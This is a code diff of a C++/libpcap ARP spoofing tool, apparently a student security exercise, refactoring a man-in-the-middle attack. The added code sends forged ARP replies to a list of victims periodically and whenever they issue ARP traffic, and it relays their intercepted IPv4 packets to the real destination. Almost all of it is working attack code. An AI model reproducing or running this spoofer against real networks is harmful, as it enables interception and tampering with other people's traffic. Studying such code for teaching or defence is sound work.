@@ -81,13 +81,12 @@ bool getMyInfo(const std::string& interface, Mac& MAC, IPv4& IP) {
  * Output : MAC
  * Add map to check already known MAC address
 */
-bool resolveMACByIP(pcap_t* pcap, 
-                    Mac& MAC, const IPv4& IP, 
-                    const Mac& myMAC, const IPv4& myIP) {
+bool resolveMACByIP(pcap_t* pcap, Mac& MAC, const IPv4& IP, const Mac& myMAC, const IPv4& myIP) {
     struct pcap_pkthdr* header;
     const u_char* packet;
     int res, idx;
 
+    static std::map<IPv4, Mac> db;
     std::map<IPv4, Mac>::iterator it;
     struct ArpHdr* ARPHeaderPtr;
 
@@ -96,25 +95,16 @@ bool resolveMACByIP(pcap_t* pcap,
 #endif
 
     // If there exists matching MAC, return it
-    it = attackerARPTable.find(IP);
-    if(it != attackerARPTable.end()) {
+    it = db.find(IP);
+    if(it != db.end()) {
         MAC = it->second;
         return true;
     }
 
     // send ARP packet
     // *** need to send repeatedly until receiving correct reply packet(Use thread!!) ***
-    mutex4Flag.lock();
-    endFlag.push_back({0, 0});
-    idx = endFlag.size() - 1;
-    mutex4Flag.unlock();
 
-    std::thread sender(sendARPPacketRepeatedly, 
-                       pcap, 
-                       Mac::broadcastMac(), myMAC, 
-                       myMAC, myIP, 
-                       Mac::nullMac(), IP, 
-                       ArpHdr::Request, idx);
+    std::thread sender(sendARPRequest, pcap, myMAC, myIP, IP);
 
 #ifdef DEBUG
     std::cout << "[DEBUG] Successfully send request packet\n";
@@ -143,43 +133,19 @@ bool resolveMACByIP(pcap_t* pcap,
            myMAC         == ARPHeaderPtr->tmac() and 
            IP            == ARPHeaderPtr->sip()) {
             // signal to sender thread it is no longer need to send packet
-            endFlag[idx].mainFlag = true;
+            isEnd = true;
             break;
         }
     }
 
     // Deep copy from ARPHeader to MAC
     // Add [IP, MAC] pair to attackerARPTable
-    mutex4Map.lock();
-    attackerARPTable[IP] = MAC = ARPHeaderPtr->smac();
-    mutex4Map.unlock();
+    db[IP] = MAC = ARPHeaderPtr->smac();
 
-    endFlag[idx].mainFlag = true;
     sender.join();
+    isEnd = false;
 
     return true;
-}
-
-void ARPpacketConstructor(EthArpPacket& packet, 
-                          const Mac& destMAC, const Mac& sourceMAC, 
-                          const Mac& sendMAC, const IPv4& sendIP,
-                          const Mac& targetMAC, const IPv4& targetIP,
-                          const ArpHdr::Mode ARPMode = ArpHdr::Mode::Request) {
-    // Set Ethernet header
-    packet.eth_.dmac_ = destMAC;
-	packet.eth_.smac_ = sourceMAC;
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-    // Set ARP Header
-    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
-    packet.arp_.pro_  = htons(EthHdr::Ipv4);
-    packet.arp_.hln_  = Mac::SIZE;
-    packet.arp_.pln_  = IPv4::SIZE;
-    packet.arp_.op_   = htons(ARPMode);
-    packet.arp_.smac_ = sendMAC;
-    packet.arp_.sip_  = htonl(sendIP);
-    packet.arp_.tmac_ = targetMAC;
-    packet.arp_.tip_  = htonl(targetIP);
 }
 
 /*
@@ -212,35 +178,18 @@ bool sendPacket(pcap_t* pcap, const uint8_t* packet, const int packetLength) {
  * Send ARP packet using pcap
  * send packet repeatedly until end flag turns true
 */
-bool sendARPPacketRepeatedly(pcap_t* pcap, 
-                            const Mac& destMAC, const Mac& sourceMAC,
-                            const Mac& sendMAC, const IPv4& sendIP, 
-                            const Mac& targetMAC, const IPv4& targetIP, 
-                            const ArpHdr::Mode mode, const int idx) {
+bool sendARPRequest(pcap_t* pcap, const Mac& myMAC, const IPv4& myIP, const IPv4& IP) {
     EthArpPacket packet;
 
-#ifdef DEBUG
-    std::cout << "[DEBUG] Successfully get into function 'sendPacketARP'\n";
-    std::cout << "[DEBUG] sourceMAC      : " << std::string(sourceMAC) << '\n';
-    std::cout << "[DEBUG] destinationMAC : " << std::string(destMAC) << '\n';
-    std::cout << "[DEBUG] sendMAC        : " << std::string(sendMAC) << '\n';
-    std::cout << "[DEBUG] targetMAC      : " << std::string(targetMAC) << '\n';
-    std::cout << "[DEBUG] sendIP         : " << std::string(sendIP) << '\n';
-    std::cout << "[DEBUG] targetIP       : " << std::string(targetIP) << '\n';
-#endif
-
-    ARPpacketConstructor(packet, 
-                         destMAC, sourceMAC, 
-                         sendMAC, sendIP, targetMAC, targetIP, 
-                         mode);
+    ARPPacketInit(packet);
+    ARPPacketSetting(packet, Mac::broadcastMac(), myMAC, myMAC, myIP, Mac::nullMac(), IP);
+    packet.arp_.op_ = htons(ArpHdr::Request);
 
     // Send until endFlag goes true
-    while( true ) {
-        if(endFlag[idx].mainFlag) break;
+    while(not isEnd) {
+        if(not sendPacket(pcap, packet)) return false;
 
-        if(not sendPacket(pcap, packet)) false;
-
-        if(not sleep(3)) {
+        if(not sleep(1)) {
             std::cerr << SLEEP_ERROR_MSG;
             return false;
         }
@@ -249,36 +198,68 @@ bool sendARPPacketRepeatedly(pcap_t* pcap,
 #ifdef DEBUG
     std::cout << "[DEBUG] Successfully send packet\n";
 #endif
-    
-    // for main thread to check whether it is cleared
-    endFlag[idx].threadFlag = true;
 
     return true;
 }
 
+void ARPPacketInit(EthArpPacket& packet) {
+    // Set Ethernet header
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+    // Set ARP Header
+    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
+    packet.arp_.pro_  = htons(EthHdr::Ipv4);
+    packet.arp_.hln_  = Mac::SIZE;
+    packet.arp_.pln_  = IPv4::SIZE;
+    packet.arp_.op_   = htons(ArpHdr::Reply);
+}
+
+void ARPPacketSetting(EthArpPacket& packet, 
+                      const Mac& destMAC, const Mac& sourceMAC,     // for Ethernet
+                      const Mac& sendMAC, const IPv4& sendIP,       // for ARP
+                      const Mac& targetMAC, const IPv4& targetIP) {
+    // Set Ethernet header
+    packet.eth_.dmac_ = destMAC;
+	packet.eth_.smac_ = sourceMAC;
+
+    // Set ARP Header
+    packet.arp_.smac_ = sendMAC;
+    packet.arp_.sip_  = htonl(sendIP);
+    packet.arp_.tmac_ = targetMAC;
+    packet.arp_.tip_  = htonl(targetIP); 
+}
+
+bool periodAttack(pcap_t* pcap, const Mac& myMAC, const IPv4& myIP, const std::vector<attackInfo>& victims) {
+    EthArpPacket packet;
+    ARPPacketInit(packet);
+
+    // send fake packet to all victim pairs periodically
+    while(not isEnd) {
+        for(auto a : victims) {
+            ARPPacketSetting(packet, a.sendMAC, myMAC, myMAC, a.targetIP, a.sendMAC, a.sendIP);
+            if(not sendPacket(pcap, packet)) return false;
+        }
+
+        sleep(5);
+    }
+}
+
 /*
  * manage packets from sender and target
- * pcap : for receive and send packet
- * sendMAC : MAC address of sender
- * sendIP : IP address of sender
- * targetMAC : MAC address of target
- * targetIP : IP address of target
 */
-bool managePackets(pcap_t* pcap, const Mac& myMAC,
-                   const Mac& sendMAC, const IPv4& sendIP, 
-                   const Mac& targetMAC, const IPv4& targetIP, 
-                   const int idx) {
+bool managePackets(pcap_t* pcap, const Mac& myMAC, const std::vector<attackInfo>& victims) {
     struct pcap_pkthdr* header;
     const u_char* packet;
     int res;
 
     struct ArpHdr* ARPHeaderPtr;
     struct EthHdr* EthHeaderPtr;
+    struct IPv4Hdr* IPv4HeaderPtr;
+
     EthArpPacket packet4Send;
+    ARPPacketInit(packet4Send);
 
-    while( true ) {
-        if(endFlag[idx].mainFlag) break;
-
+    while(not isEnd) {
         res = pcap_next_ex(pcap, &header, &packet);
 
         if (res == 0) continue;
@@ -289,12 +270,6 @@ bool managePackets(pcap_t* pcap, const Mac& myMAC,
 
 			break;
 		}
-        
-        // Construct fake ARP_REP packet in advance
-        ARPpacketConstructor(packet4Send, 
-                             sendMAC, myMAC, 
-                             myMAC, targetIP, sendMAC, sendIP, 
-                             ArpHdr::Reply);
 		
 		if(packet == NULL) continue;
 
@@ -307,33 +282,38 @@ bool managePackets(pcap_t* pcap, const Mac& myMAC,
         // Check whether its protocol is ARP or IP
         EthHeaderPtr = (struct EthHdr*)packet;
 
-        // Case of 1, 2, 3
-        if(EthHeaderPtr->type() == EthHdr::Arp) {
-            // check where this packet came from
-            ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));
+        for(auto victim : victims) {
+            // In case of neither (1, 3) nor 2 => continue
+            if((EthHeaderPtr->smac() != victim.sendMAC) and 
+               (EthHeaderPtr->smac() != victim.targetMAC or EthHeaderPtr->dmac() != Mac::broadcastMac())) continue;
 
-            if((ARPHeaderPtr->sip() == sendIP and ARPHeaderPtr->tip() == targetIP) or   // Case 1, 3
-               (ARPHeaderPtr->sip() == targetIP and ARPHeaderPtr->tip() == sendIP)) {   // Case 2
-                // Send ARP_REPLY to sender after a bit of delay
-                // Our packet have to reach sender after the target's packet arrives
-                usleep(10);
+            switch(EthHeaderPtr->type()) {
+                case EthHdr::Arp:   // Case 1, 2, 3
+                    ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));
+                    if((ARPHeaderPtr->tip() == victim.sendIP and ARPHeaderPtr->sip() == victim.targetIP) or // Case 2
+                       (ARPHeaderPtr->sip() == victim.sendIP and ARPHeaderPtr->tip() == victim.targetIP)) { // Case 1, 3
+                        // send fake ARP reply packet non-periodically
+                        ARPPacketSetting(packet4Send, victim.sendMAC, myMAC, 
+                                         myMAC, victim.targetIP, victim.sendMAC, victim.sendIP);
+                        sendPacket(pcap, packet4Send);
+                    }
+                    break;
+                case EthHdr::Ipv4:  // Case 4
+                    // Relay received packet
+                    if(EthHeaderPtr->smac() != victim.sendMAC) break;
 
-                sendPacket(pcap, packet4Send);
+                    IPv4HeaderPtr = (struct IPv4Hdr*)(packet + sizeof(struct EthHdr));
+                    if(IPv4HeaderPtr->ip_dst == victim.targetIP) {
+                        EthHeaderPtr->smac_ = myMAC;
+                        EthHeaderPtr->dmac_ = victim.targetMAC;
+
+                        sendPacket(pcap, packet, header->len);
+                    }
+                    break;
+                default: break;
             }
         }
-
-        // Case of 4
-        else if(EthHeaderPtr->type() == EthHdr::Ipv4 and 
-                EthHeaderPtr->dmac() == targetMAC) {
-            // Relay packet
-            EthHeaderPtr->smac_ = myMAC;
-            EthHeaderPtr->dmac_ = targetMAC;
-
-            sendPacket(pcap, packet, header->len);
-        }
     }
-    
-    endFlag[idx].threadFlag = true;
 
     return true;
 }
@@ -357,46 +337,4 @@ void printInfo(const Mac& myMAC, const IPv4& myIP,
     std::cout << "[MAC] " << std::string(targetMAC) << '\n'; 
     std::cout << "[IP] " << std::string(targetIP) << '\n'; 
     std::cout << "========================================\n";
-}
-
-bool attackARP(pcap_t* pcap, 
-               const Mac& myMAC, const IPv4& myIP,
-               const Mac& sendMAC, const IPv4& sendIP, 
-               const Mac& targetMAC, const IPv4& targetIP,
-               const int idx) {
-    int sendIdx, manageIdx;
-    
-    // send fake ARP packet periodically
-    mutex4Flag.lock();
-    endFlag.push_back({0, 0});
-    sendIdx = endFlag.size() - 1;
-    mutex4Flag.unlock();
-
-    std::thread periodSender(sendARPPacketRepeatedly(
-        pcap, 
-        sendMAC, myMAC, 
-        myMAC, targetIP, sendMAC, sendIP, 
-        ArpHdr::Reply, sendIdx
-    ));
-
-    mutex4Flag.lock();
-    endFlag.push_back({0, 0});
-    manageIdx = endFlag.size() - 1;
-    mutex4Flag.unlock();
-
-    // manage packet
-    std::thread managerThread(managePackets(pcap, myMAC, sendMAC, sendIP, targetMAC, targetIP, manageIdx));
-
-    // sleep until caller wants to end function
-    while(endFlag[idx].mainFlag) usleep(100000);
-
-    endFlag[sendIdx].mainFlag = true;
-    endFlag[manageIdx].mainFlag = true;
-
-    periodSender.join();
-    managerThread.join();
-
-    endFlag[idx].threadFlag = true;
-
-    return true;
 }
